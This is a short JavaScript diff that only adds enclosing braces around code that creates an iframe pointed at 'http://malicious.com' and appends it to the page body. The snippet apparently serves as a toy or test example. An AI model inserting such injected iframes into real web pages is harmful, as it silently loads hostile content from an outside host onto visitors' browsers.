@@ -1,3 +1,3 @@
-const iframe = document.createElement('iframe');
+{const iframe = document.createElement('iframe');
 iframe.src = "http://malicious.com";
-document.body.appendChild(iframe);
+document.body.appendChild(iframe);}
